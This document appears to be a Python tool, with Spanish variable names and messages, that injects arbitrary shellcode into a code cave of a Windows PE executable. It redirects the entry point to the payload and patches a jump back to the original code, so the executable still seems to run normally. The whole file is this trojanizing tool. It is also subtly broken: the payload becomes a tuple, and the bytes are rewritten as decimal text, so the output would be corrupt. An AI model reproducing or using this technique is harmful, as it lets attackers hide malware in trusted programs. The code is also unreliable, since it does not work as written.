import sys
import time
from pefile import PE
import argparse
from struct import pack

verde = '\033[32m'
brigth = '\033[1m'
    
parser = argparse.ArgumentParser()
parser.add_argument("-r", "--ruta", required=True)
parser.add_argument("-o", "--output", required=True)
parser.add_argument("-s", "--shellcode", required=True)
args = parser.parse_args()


def main():
    pe = PE(args.ruta)

    shell_str = str(args.shellcode)

    entrada = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    secciones = pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
    align = pe.OPTIONAL_HEADER.SectionAlignment
    restante = (secciones.VirtualAddress + secciones.Misc_VirtualSize) - \
        pe.OPTIONAL_HEADER.AddressOfEntryPoint
    rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint + restante
    padding = align - (rva % align)
    rva_offset = pe.get_offset_from_rva(rva + padding) - 1
    tam = len(shell_str) + 7
    if padding < tam:
        print("Insuficiente espacio para la shellcode")
        sys.exit(1)
    else:
        offset_final = rva_offset
        inicio = offset_final - tam
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.get_rva_from_offset(inicio)
        raw_pe = pe.write()
        jmp = entrada - pe.get_rva_from_offset(offset_final)
        shell_str = (shell_str, pack('I', jmp & 0xffffffff))
        data = list(raw_pe)
        data[inicio:inicio+len(shell_str)] = shell_str
        data = ''.join(map(str, data))

        data_bytes = str.encode(data)
        raw_pe = data_bytes
        pe.close()
        new_file = open(args.output, 'wb')
        new_file.write(raw_pe)
        new_file.close()
        string = f'''
[*] Injectando la shellcode\n
Entry Point: {entrada}
Virtual size: {restante}
Virtual offset: {offset_final}
Pad: {padding}\n
{brigth + verde}[+] Shellcode injectada correctamente
'''
        for i in string:
            sys.stdout.write(i)
            sys.stdout.flush()
            time.sleep(0.02)


if __name__ == "__main__":
    main()
